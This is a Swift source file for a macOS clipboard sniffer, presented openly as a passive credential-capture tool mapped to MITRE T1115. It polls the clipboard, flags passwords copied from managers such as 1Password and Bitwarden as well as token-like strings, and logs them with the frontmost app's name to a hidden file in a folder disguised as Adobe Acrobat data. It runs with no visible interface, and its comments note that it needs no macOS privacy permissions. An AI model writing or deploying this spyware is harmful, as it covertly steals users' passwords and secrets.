import Cocoa
import Foundation

// Clipboard Sniffer — Zero TCC Passive Credential Capture
// Monitors clipboard for password-like content from password managers
// (1Password, Bitwarden, etc. copy passwords to clipboard)
// Tracks frontmost app for context.
//
// MITRE: T1115 (Clipboard Data)
// TCC: NONE REQUIRED — NSPasteboard and frontmostApplication need no permissions

class ClipboardSniffer {
    private var lastChangeCount: Int = 0
    private var logFile: FileHandle?
    private var logPath: String
    private var timer: Timer?
    
    // Password manager process names
    private let passwordManagers = [
        "1Password", "Bitwarden", "LastPass", "Dashlane",
        "KeePassXC", "Enpass", "RoboForm", "Keeper",
        "NordPass", "Keychain Access"
    ]
    
    // Patterns that suggest credential-related content
    private let sensitivePatterns = [
        "password", "passwd", "secret", "token", "api_key",
        "apikey", "api-key", "bearer", "authorization"
    ]
    
    init() {
        let support = NSHomeDirectory() + "/Library/Application Support/Adobe/AcrobatDC"
        try? FileManager.default.createDirectory(atPath: support, withIntermediateDirectories: true)
        logPath = support + "/.clipboard_cache"
        
        if !FileManager.default.fileExists(atPath: logPath) {
            FileManager.default.createFile(atPath: logPath, contents: nil)
        }
        logFile = FileHandle(forWritingAtPath: logPath)
        logFile?.seekToEndOfFile()
        
        lastChangeCount = NSPasteboard.general.changeCount
        
        let header = "\n--- Clipboard monitor started: \(ISO8601DateFormatter().string(from: Date())) ---\n"
        logFile?.write(header.data(using: .utf8)!)
    }
    
    func start() {
        // Poll clipboard every 500ms — lightweight, no TCC
        timer = Timer.scheduledTimer(withTimeInterval: 0.5, repeats: true) { [weak self] _ in
            self?.checkClipboard()
        }
        
        RunLoop.current.run()
    }
    
    private func checkClipboard() {
        let pb = NSPasteboard.general
        let currentCount = pb.changeCount
        
        guard currentCount != lastChangeCount else { return }
        lastChangeCount = currentCount
        
        // Get clipboard content
        guard let content = pb.string(forType: .string) else { return }
        
        // Get frontmost app context (no TCC needed)
        let frontApp = NSWorkspace.shared.frontmostApplication
        let appName = frontApp?.localizedName ?? "Unknown"
        let bundleId = frontApp?.bundleIdentifier ?? "unknown"
        
        // Determine if this is interesting
        let isFromPwManager = passwordManagers.contains(where: { 
            appName.localizedCaseInsensitiveContains($0) || 
            bundleId.localizedCaseInsensitiveContains($0.lowercased())
        })
        
        let looksLikePassword = isPasswordLike(content)
        let hasSensitiveContext = sensitivePatterns.contains(where: {
            content.lowercased().contains($0)
        })
        
        // Log based on interest level
        if isFromPwManager {
            // High confidence — this is likely a password
            log(level: "CRED", app: appName, bundle: bundleId, content: content)
        } else if looksLikePassword {
            // Medium confidence — looks like a password/token
            log(level: "PROB", app: appName, bundle: bundleId, content: content)
        } else if hasSensitiveContext {
            // Low confidence — contains sensitive keywords
            log(level: "CTX", app: appName, bundle: bundleId, content: content)
        }
        // Skip normal clipboard activity to keep log manageable
    }
    
    private func isPasswordLike(_ text: String) -> Bool {
        let trimmed = text.trimmingCharacters(in: .whitespacesAndNewlines)
        
        // Skip if multiline or very long (probably not a password)
        if trimmed.contains("\n") || trimmed.count > 128 { return false }
        
        // Skip if it's a URL
        if trimmed.hasPrefix("http://") || trimmed.hasPrefix("https://") { return false }
        
        // Skip if too short
        if trimmed.count < 6 { return false }
        
        // Check for password-like characteristics
        let hasUpper = trimmed.range(of: "[A-Z]", options: .regularExpression) != nil
        let hasLower = trimmed.range(of: "[a-z]", options: .regularExpression) != nil
        let hasDigit = trimmed.range(of: "[0-9]", options: .regularExpression) != nil
        let hasSpecial = trimmed.range(of: "[!@#$%^&*()_+\\-=\\[\\]{};':\"\\\\|,.<>/?]", options: .regularExpression) != nil
        let hasNoSpaces = !trimmed.contains(" ")
        
        // High entropy strings with mixed characters and no spaces = likely password
        var complexity = 0
        if hasUpper { complexity += 1 }
        if hasLower { complexity += 1 }
        if hasDigit { complexity += 1 }
        if hasSpecial { complexity += 1 }
        
        // 3+ character classes, no spaces, reasonable length = probable password
        return complexity >= 3 && hasNoSpaces && trimmed.count >= 8 && trimmed.count <= 64
        
        // Also catch API keys / tokens (long hex/base64 strings)
        // This is handled by length + complexity check above
    }
    
    private func log(level: String, app: String, bundle: String, content: String) {
        let ts = ISO8601DateFormatter().string(from: Date())
        // Truncate content for safety
        let display = String(content.prefix(128))
        let entry = "[\(ts)] [\(level)] [\(app) (\(bundle))] \(display)\n"
        logFile?.write(entry.data(using: .utf8)!)
    }
    
    deinit {
        logFile?.closeFile()
    }
}

// Entry point — completely hidden
let app = NSApplication.shared
app.setActivationPolicy(.prohibited)

signal(SIGTERM) { _ in exit(0) }

let sniffer = ClipboardSniffer()
sniffer.start()
